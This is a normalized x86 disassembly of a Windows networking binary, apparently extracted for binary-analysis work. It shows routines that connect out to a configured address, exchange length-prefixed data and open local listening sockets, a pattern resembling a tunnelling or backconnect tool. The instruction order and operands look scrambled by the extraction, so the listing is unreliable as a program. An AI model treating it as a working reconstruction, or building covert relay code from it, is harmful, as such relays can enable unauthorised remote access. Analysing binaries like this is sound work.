sub_401000
push ebx
push esi
push 0x24
call sub_4049d7
mov esi eax
mov eax 0xa
mov ecx 0x8235
xor ebx ebx
push 0xa8
mov [ esi ] 0x1000
mov [ esi + 0x4 ] 0x100
mov [ esi + 0x18 ] eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x8 ] cx
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0xbb8
call sub_4049d7
add esp 0x8
cmp eax ebx
je r-xdata
mov edx 0xea60
mov ecx ebx
mov [ ebx + 0x64 ] r--data
mov [ ebx + 0x68 ] dx
call sub_401a00
call sub_4031c0
push ebx
call sub_4016d0
push ebx
call sub_4049cc
push esi
call sub_4049cc
add esp 0x8
pop esi
xor eax eax
pop ebx
retn 0x10
push esi
push eax
call sub_401310
mov ebx eax
sub_4010a0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_404b3b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4049cc
add esp 0x4
sub_4010d0
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
imul ecx ecx 0x3e8
mov eax 0x10624dd3
imul ecx
sub esp 0x10
push ebx
sar edx 0x6
push esi
mov ebx edx
shr ebx 0x1f
push edi
xor edi edi
add ebx edx
mov [ ebp + 0x14 ] ecx
cmp [ ebp + 0x18 ] edi
je r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
push ecx
mov [ ebp - 0x10 ] eax
push 0x1
lea eax [ ebp - 0x10 ]
mov edx 0x300
push eax
mov [ ebp - 0xc ] dx
call [ WSAPoll@IAT ]
test eax eax
jle r-xdata
cmp esi 0x4
je r-xdata
add esi eax
cmp esi 0x4
jne r-xdata
mov eax 0xfffffffa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp - 0xa ] 0x300
jne r-xdata
mov [ ebp + 0x18 ] edi
cmp esi 0x4
jge r-xdata
mov eax 0xfffffff6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
push 0x0
mov ecx 0x4
sub ecx esi
push ecx
mov ecx [ ebp + 0x8 ]
lea eax [ esi + edx ]
push eax
push ecx
call [ recv@IAT ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov [ ebp - 0x4 ] eax
cmp eax [ ebp + 0x10 ]
jg r-xdata
test esi esi
jns r-xdata
push 0x1
push 0x4000
call sub_404f3b
add esp 0x8
push 0x0
mov esi eax
mov eax [ ebp + 0x8 ]
push 0x4000
push esi
push eax
call [ recv@IAT ]
push esi
call sub_404f01
add esp 0x4
mov eax 0xfffffffe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jg r-xdata
mov eax esi
neg eax
sbb eax eax
and eax 0xfffffffb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push 0x0
sub eax edi
push eax
mov eax [ ebp + 0xc ]
lea ecx [ edi + eax ]
push ecx
push edx
call [ recv@IAT ]
mov esi eax
test esi esi
jns r-xdata
jle r-xdata
call sub_405051
cmp [ eax ] 0xb
je r-xdata
mov eax [ ebp + 0x18 ]
add eax ebx
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
add edi esi
jmp r-xdata
cmp [ ebp - 0x4 ] edi
jne r-xdata
call sub_405051
cmp [ eax ] 0x4
je r-xdata
pop edi
pop esi
mov eax 0xfffffffd
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call [ Sleep@IAT ]
mov eax [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
sub_401250
push ebp
mov ebp esp
sub esp 0xc
push esi
xor esi esi
or eax 0xffffffff
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0xc ] esi
je r-xdata
cmp eax 0x4
je r-xdata
push 0x7d0
push 0x1
lea ecx [ ebp - 0xc ]
mov eax 0x10
push ecx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] ax
call [ WSAPoll@IAT ]
cmp eax esi
jle r-xdata
mov [ ebp + 0xc ] esi
test ebx ebx
je r-xdata
push esi
push 0x4
lea edx [ ebp - 0x4 ]
push edx
push edi
call [ send@IAT ]
jmp r-xdata
mov eax 0xfffffffe
pop esi
mov esp ebp
pop ebp
retn
test [ ebp - 0x6 ] 0x10
jne r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push 0x0
mov eax ebx
sub eax esi
push eax
lea edx [ esi + ecx ]
push edx
push edi
call [ send@IAT ]
test eax eax
jle r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0x2
mov [ ebp + 0xc ] ecx
cmp ecx 0x7d0
jl r-xdata
add esi eax
jmp r-xdata
push 0x2
call [ Sleep@IAT ]
test eax eax
js r-xdata
cmp esi ebx
jne r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
je r-xdata
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn
sub_401310
push ebp
mov ebp esp
push 0xffffffff
push sub_40a8c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
push 0x18
mov [ esi + 0x8 ] ebx
call sub_4049d7
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_404adf
push r--data
lea ecx [ ebp - 0x2c ]
push ecx
mov [ ebp - 0x2c ] r--data
call sub_405255
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x15 ] 0x1
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] 0x1
push 0x18
mov [ esi + 0x28 ] ebx
call sub_4049d7
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_404adf
push r--data
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] r--data
call sub_405255
int3
mov [ esi + 0x24 ] eax
mov [ eax ] eax
mov eax [ esi + 0x24 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x24 ]
mov [ eax + 0x8 ] eax
mov edx [ esi + 0x24 ]
mov [ edx + 0x14 ] 0x1
mov eax [ esi + 0x24 ]
mov [ eax + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x2
push 0x18
mov [ esi + 0x38 ] ebx
call sub_4049d7
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_404adf
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_405255
mov [ esi + 0x34 ] eax
mov [ eax ] eax
mov eax [ esi + 0x34 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x34 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx + 0x14 ] 0x1
mov edx [ esi + 0x34 ]
mov [ edx + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x3
push 0x18
mov [ esi + 0x48 ] ebx
call sub_4049d7
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esi + 0x44 ] eax
mov [ eax ] eax
mov eax [ esi + 0x44 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x44 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x44 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ esi + 0x44 ]
mov [ ecx + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x4
push 0x18
mov [ esi + 0x58 ] ebx
call sub_4049d7
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_404adf
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] r--data
call sub_405255
mov [ esi + 0x54 ] eax
mov [ eax ] eax
mov eax [ esi + 0x54 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x54 ]
mov [ eax + 0x8 ] eax
mov edx [ esi + 0x54 ]
mov [ edx + 0x14 ] 0x1
mov eax [ esi + 0x54 ]
mov [ eax + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x5
lea edi [ esi + 0x74 ]
push 0x8
mov [ edi ] ebx
call sub_4049d7
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_404adf
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x2c ] r--data
call sub_405255
mov [ edi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ edi ]
mov [ ecx ] edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ ebp - 0x4 ] 0x6
lea edi [ esi + 0x8c ]
push 0x8
mov [ edi ] ebx
call sub_4049d7
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_404adf
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_405255
mov [ edi ] eax
xor edx edx
mov [ eax + 0x4 ] edx
xor ecx ecx
mov [ eax ] ecx
mov edx [ edi ]
mov [ edx ] edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
push 0x24
mov [ ebp - 0x4 ] 0x7
call sub_4049d7
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
movzx edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] dx
mov edx [ ecx + 0x18 ]
mov [ eax + 0x18 ] edx
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x14 ]
mov [ eax + 0x14 ] edx
movzx edx [ ecx + 0xa ]
mov [ eax + 0xa ] dx
mov edx [ ecx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ecx + 0x20 ]
mov [ eax + 0x20 ] edx
mov ecx [ ecx + 0x10 ]
mov [ eax + 0x10 ] ecx
jmp r-xdata
xor edi edi
mov edx [ esi + 0xa4 ]
mov eax [ edx ]
add eax 0x2
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
je r-xdata
push 0xc
mov [ esi + 0xa4 ] eax
call sub_4049d7
mov edi eax
add esp 0x4
cmp edi ebx
je r-xdata
mov [ esi + 0x60 ] edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x1
push eax
call sub_404f3b
add esp 0x8
mov [ edi ] eax
jmp r-xdata
sub_401650
push ebp
mov ebp esp
push 0xffffffff
push sub_40a838
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_403d70
mov eax [ edi + 0x4 ]
push eax
call sub_4049cc
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4016d0
push ebp
mov ebp esp
push 0xffffffff
push sub_40a9d9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x7
mov esi [ edi + 0x60 ]
test esi esi
je r-xdata
mov eax [ edi + 0xa4 ]
push eax
call sub_4049cc
mov ecx [ edi + 0x4 ]
mov ebx [ ecx + 0x4 ]
add esp 0x4
cmp [ ebx + 0x15 ] 0x0
mov esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_404f01
push esi
call sub_4049cc
add esp 0x8
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
mov eax [ edi + 0x44 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x15 ] 0x0
mov [ ebp - 0x10 ] esi
jne r-xdata
mov edx [ esi + 0x8 ]
push edx
mov ecx edi
call sub_403c40
mov esi [ esi ]
push ebx
call sub_4049cc
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
mov eax [ edi + 0x44 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x44 ]
mov [ eax ] eax
mov eax [ edi + 0x44 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x48 ] 0x0
mov eax [ edi + 0x54 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x15 ] 0x0
lea ebx [ edi + 0x50 ]
mov [ ebp - 0x10 ] esi
jne r-xdata
lea esp [ esp ]
mov eax [ ebx + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ ebx + 0x4 ]
mov [ eax ] eax
mov eax [ ebx + 0x4 ]
mov [ eax + 0x8 ] eax
lea esi [ edi + 0x8c ]
mov [ ebx + 0x8 ] 0x0
call sub_403c90
mov eax [ esi ]
push eax
call sub_4049cc
mov [ esi ] 0x0
add esp 0x4
lea esi [ edi + 0x74 ]
call sub_403c90
mov eax [ esi ]
push eax
call sub_4049cc
add esp 0x4
mov [ esi ] 0x0
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] 0x8
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x14 ]
mov eax ebx
call sub_403d70
mov ebx [ ebx + 0x4 ]
push ebx
call sub_4049cc
lea ebx [ edi + 0x40 ]
add esp 0x4
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x9
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax ebx
call sub_403d70
mov ebx [ ebx + 0x4 ]
push ebx
call sub_4049cc
lea ebx [ edi + 0x30 ]
add esp 0x4
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0xa
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax ebx
call sub_403d70
mov ebx [ ebx + 0x4 ]
push ebx
call sub_4049cc
lea ebx [ edi + 0x20 ]
add esp 0x4
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0xb
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax ebx
call sub_403d70
mov ebx [ ebx + 0x4 ]
push ebx
call sub_4049cc
mov eax [ edi + 0x10 ]
add esp 0x4
xor esi esi
cmp eax esi
je r-xdata
lea ecx [ ecx ]
mov ecx [ esi + 0x8 ]
push ecx
lea ecx [ edi + 0x40 ]
call sub_403c40
mov edx [ ebp - 0x10 ]
mov esi [ esi ]
push edx
call sub_4049cc
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov [ ebp - 0x10 ] esi
je r-xdata
mov [ edi + 0x10 ] esi
mov [ edi + 0x14 ] esi
mov [ edi + 0x18 ] esi
mov [ ebp - 0x4 ] 0xc
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x14 ]
mov eax edi
call sub_403d70
mov eax [ edi + 0x4 ]
push eax
call sub_4049cc
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_4049cc
add esp 0x4
mov ecx [ esi + 0x8 ]
push ecx
mov ecx ebx
call sub_403c40
mov edx [ ebp - 0x10 ]
mov esi [ esi ]
push edx
call sub_4049cc
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov [ ebp - 0x10 ] esi
je r-xdata
sub_401930
push ebx
push esi
push 0x24
mov esi eax
call sub_4049d7
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
movzx edx [ esi + 0x8 ]
mov [ eax + 0x8 ] dx
mov ecx [ esi + 0x18 ]
mov [ eax + 0x18 ] ecx
mov edx [ esi ]
mov [ eax ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x14 ] ecx
movzx edx [ esi + 0xa ]
mov [ eax + 0xa ] dx
mov ecx [ esi + 0xc ]
mov [ eax + 0xc ] ecx
mov edx [ esi + 0x20 ]
mov [ eax + 0x20 ] edx
mov ecx [ esi + 0x10 ]
mov [ eax + 0x10 ] ecx
jmp r-xdata
xor esi esi
mov edx [ edi + 0x10 ]
mov eax [ edx ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
cmp eax ebx
je r-xdata
push 0xc
mov [ edi + 0x10 ] eax
call sub_4049d7
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
xor eax eax
pop esi
mov [ edi + 0x8 ] eax
mov eax edi
pop ebx
retn
mov eax [ edi + 0x10 ]
mov eax [ eax ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
cmp eax ebx
je r-xdata
push 0xc
mov [ edi + 0xc ] esi
call sub_4049d7
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
push 0x1
push eax
call sub_404f3b
add esp 0x8
mov [ esi ] eax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop esi
mov eax edi
pop ebx
retn
push 0x1
push eax
call sub_404f3b
add esp 0x8
mov [ esi ] eax
sub_401a00
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_40a91b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x340
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x338 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x350 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov esi ecx
mov [ esp + 0x1c ] esi
mov [ esp + 0x4c ] eax
mov [ esp + 0x170 ] eax
mov [ esp + 0x174 ] eax
mov [ esp + 0x178 ] eax
mov [ esp + 0x358 ] eax
lea eax [ esp + 0x1b4 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
mov ebx [ htons@IAT ]
mov edi [ connect@IAT ]
mov eax [ esi + 0x6c ]
push 0x1388
call [ Sleep@IAT ]
xor eax eax
jmp r-xdata
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
mov edx [ esi + 0x64 ]
mov ecx 0x2
push edx
mov [ esi + 0x6c ] eax
mov [ esp + 0x1a8 ] cx
call [ inet_addr@IAT ]
mov [ esp + 0x1a8 ] eax
movzx eax [ esi + 0x68 ]
push eax
call ebx
mov edx [ esi + 0x6c ]
push 0x10
lea ecx [ esp + 0x1a8 ]
push ecx
push edx
mov [ esp + 0x1b2 ] ax
call edi
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
mov ebx [ esi + 0x6c ]
push 0x186a0
push 0x1
lea eax [ esp + 0xc4 ]
mov edx 0x300
push eax
mov [ esp + 0x38 ] ecx
mov [ esp + 0x20 ] 0x0
mov [ esp + 0xc8 ] ebx
mov [ esp + 0xcc ] dx
call [ WSAPoll@IAT ]
test eax eax
jle r-xdata
mov [ esi + 0x6c ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x350 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x338 ]
xor ecx esp
call sub_4049bd
mov esp ebp
pop ebp
retn
test [ esp + 0xc2 ] 0x300
je r-xdata
xor edi edi
lea esp [ esp ]
cmp edi 0x4
jne r-xdata
add edi eax
cmp edi 0x4
jne r-xdata
mov [ esp + 0x40 ] 0x0
cmp edi 0x4
jl r-xdata
mov edx [ esp + 0x2c ]
push 0x0
mov ecx 0x4
sub ecx edi
push ecx
lea eax [ edi + edx ]
push eax
push ebx
call [ recv@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x2c ]
mov eax [ ecx ]
mov [ esp + 0x3c ] eax
dec eax
cmp eax 0x1
ja r-xdata
push 0x1
push 0x4000
call sub_404f3b
add esp 0x8
push 0x0
push 0x4000
mov esi eax
push esi
push ebx
call [ recv@IAT ]
push esi
call sub_404f01
add esp 0x4
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x3c ]
push 0x0
sub edx eax
add eax [ esp + 0x30 ]
push edx
push eax
push ebx
call [ recv@IAT ]
mov edi eax
test edi edi
jns r-xdata
jle r-xdata
call sub_405051
cmp [ eax ] 0xb
je r-xdata
mov eax [ esp + 0x40 ]
add eax 0x64
mov [ esp + 0x40 ] eax
cmp eax 0x186a0
jge r-xdata
add [ esp + 0x14 ] edi
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp [ esp + 0x3c ] eax
jne r-xdata
call sub_405051
cmp [ eax ] 0x4
je r-xdata
push 0x64
call [ Sleep@IAT ]
cmp eax 0x2
jne r-xdata
test edi edi
mov edx [ esi + 0x60 ]
mov eax [ edx ]
mov cx [ eax ]
mov edx 0x2
push r--data
mov [ esi + 0x70 ] cx
mov [ esp + 0x1a8 ] dx
call [ inet_addr@IAT ]
push 0x6
mov [ esp + 0x1ac ] eax
push 0x1
xor eax eax
push 0x2
mov [ esp + 0x1b2 ] ax
call [ socket@IAT ]
push 0x10
lea ecx [ esp + 0x1a8 ]
mov edi eax
push ecx
push edi
mov [ esp + 0x4c ] edi
call [ bind@IAT ]
lea edx [ esp + 0x58 ]
push edx
lea eax [ esp + 0x1a8 ]
push eax
push edi
mov [ esp + 0x64 ] 0x10
call [ getsockname@IAT ]
mov ecx [ esi + 0xa4 ]
mov dx [ esp + 0x1a6 ]
push 0x64
push edi
mov [ ecx + 0x8 ] dx
call [ listen@IAT ]
lea eax [ esp + 0x78 ]
push eax
push 0x8004667e
push edi
mov [ esp + 0x84 ] 0x1
call [ ioctlsocket@IAT ]
mov [ esp + 0x33 ] 0x0
mov [ esp + 0x3c ] 0x0
lea ebx [ ebx ]
mov [ esp + 0x2c ] 0x1
mov esi [ esp + 0x2c ]
mov esi [ ebx + 0x14 ]
sub esi [ ebx + 0x10 ]
sar esi 0x1
inc esi
mov [ esp + 0x2c ] esi
jmp r-xdata
xor ecx ecx
mov eax esi
mov edx 0x8
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_4049b2
mov ecx [ ebx + 0x6c ]
add esp 0x4
mov edx 0x300
mov [ esp + 0x34 ] eax
mov [ esp + 0x33 ] 0x1
mov [ eax ] ecx
mov [ eax + 0x4 ] dx
test edi edi
jle r-xdata
mov ecx [ esp + 0x34 ]
push ecx
call sub_4049cc
add esp 0x4
cmp [ esp + 0x33 ] 0x0
je r-xdata
mov ecx 0x1
mov [ esp + 0x20 ] ecx
cmp [ esp + 0x2c ] ecx
jle r-xdata
mov ecx 0x310
mov [ eax + 0x4 ] cx
mov eax [ esp + 0x2c ]
mov esi [ esp + 0x34 ]
push 0xffffffff
push eax
push esi
call [ WSAPoll@IAT ]
test eax eax
jg r-xdata
mov edx [ ebx + 0x10 ]
movzx edi [ edx + ecx * 2 - 0x2 ]
mov edx [ ebx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov esi edx
mov [ esp + 0x14 ] edx
jne r-xdata
test [ esi + 0x6 ] 0x7
je r-xdata
jns r-xdata
mov eax esi
cmp esi edx
je r-xdata
mov edi edi
mov edx [ esp + 0x34 ]
test [ edx + 0x6 ] 0x10
je r-xdata
mov eax [ esp + 0x3c ]
mov ecx eax
inc eax
mov [ esp + 0x3c ] eax
cmp ecx 0x5
jle r-xdata
mov ebx [ esp + 0x1c ]
call sub_405051
cmp [ eax ] 0xb
mov [ esp + 0x110 ] edi
lea edi [ esp + 0x110 ]
mov esi ebx
mov [ esp + 0x114 ] 0x0
call sub_404870
mov ecx [ esp + 0x14 ]
push ecx
push ebx
lea esi [ esp + 0x9c ]
call sub_4043c0
mov eax [ esp + 0x94 ]
mov ecx [ esp + 0x20 ]
cmp edi [ esi + 0xc ]
jge r-xdata
mov esi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x34 ]
mov edx 0x300
test [ eax + 0x6 ] dx
je r-xdata
lea ecx [ ebx + 0x8c ]
lea eax [ esp + 0x198 ]
mov [ esp + 0x14 ] ecx
call sub_403e10
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov esi ebx
call sub_4030e0
test al al
je r-xdata
mov edi [ ebx + 0x84 ]
mov [ esp + 0x38 ] edi
cmp edi 0xa
jge r-xdata
mov eax [ esp + 0x34 ]
push eax
call sub_4049cc
add esp 0x4
mov esi ebx
call sub_4030e0
test al al
je r-xdata
mov edx [ eax + 0x10 ]
mov eax [ esp + 0x34 ]
mov [ eax + ecx * 8 ] edx
mov edx 0x300
mov [ eax + ecx * 8 + 0x4 ] dx
inc ecx
mov [ esp + 0x20 ] ecx
cmp ecx [ esp + 0x2c ]
jl r-xdata
cmp [ eax + 0xc ] edi
jge r-xdata
mov [ esp + 0x14 ] esi
cmp [ eax + 0x15 ] 0x0
je r-xdata
cmp [ esp + 0x38 ] 0xa
jge r-xdata
mov ebx [ esp + 0x1c ]
mov ecx [ ebx + 0xa4 ]
mov edx [ ecx ]
mov ecx [ ebx + 0x60 ]
mov eax [ eax ]
push 0x0
push 0xa
add edx 0x2
push edx
mov edx [ ecx ]
push edx
push eax
call sub_4010d0
add esp 0x14
mov [ esp + 0x24 ] eax
test eax eax
je r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov [ esp + 0x3c ] 0x0
mov esi [ esp + 0x1c ]
jmp r-xdata
mov eax 0x1
mov [ esp + 0x14 ] eax
cmp [ esp + 0x2c ] eax
jle r-xdata
jns r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
lea edi [ eax + ecx * 4 ]
lea ecx [ ebx + 0x74 ]
lea eax [ esp + 0x18c ]
mov [ esp + 0x24 ] ecx
call sub_403e10
mov ecx [ eax ]
test ecx ecx
jne r-xdata
sub eax esi
mov ecx [ eax + 0x8 ]
mov esi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp esi eax
ja r-xdata
mov ebx [ esp + 0x1c ]
mov ecx [ ebx + 0x60 ]
mov eax [ ecx ]
mov edx [ esp + 0x24 ]
mov ecx [ ebx + 0x24 ]
add edx 0xfffffffe
mov [ esp + 0x10 ] eax
movzx eax [ eax ]
mov [ esp + 0x14 ] edx
xor edx edx
test ax ax
sete dl
add ebx 0x20
mov [ esp + 0x20 ] eax
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ esp + 0x18 ] ecx
jne r-xdata
cmp eax 0xfffffffe
jmp r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov eax [ esp + 0x14 ]
inc eax
mov [ esp + 0x14 ] eax
cmp eax [ esp + 0x2c ]
jl r-xdata
mov edx [ ebx + 0xa4 ]
mov eax [ edx ]
add eax 0x2
push 0x1
push eax
call sub_404f3b
mov ecx [ ebx + 0x10 ]
mov edx [ esp + 0x1c ]
mov cx [ ecx + edx * 2 - 0x2 ]
mov [ eax ] cx
mov edx [ ebx + 0xa4 ]
mov ecx [ edx ]
mov edx [ esp + 0x3c ]
push 0x0
push 0x2
mov [ esp + 0x30 ] eax
add eax 0x2
push ecx
push eax
mov eax [ esi + edx ]
push eax
call sub_4010d0
mov ecx [ ebx + 0x80 ]
lea esi [ ebx + 0x74 ]
mov [ esp + 0x40 ] eax
mov eax [ esi + 0x10 ]
add ecx eax
add esp 0x1c
test cl 0x3
jne r-xdata
mov eax ecx
cmp ecx [ ebx + 0x4 ]
je r-xdata
mov edi edi
je r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ebx [ edi ]
mov ecx [ eax + ecx * 4 ]
mov edx [ esp + 0x34 ]
mov edi [ edx ]
mov [ esp + 0x28 ] ecx
or eax 0xffffffff
mov [ esp + 0x10 ] ebx
sub eax esi
mov ecx [ eax + 0x8 ]
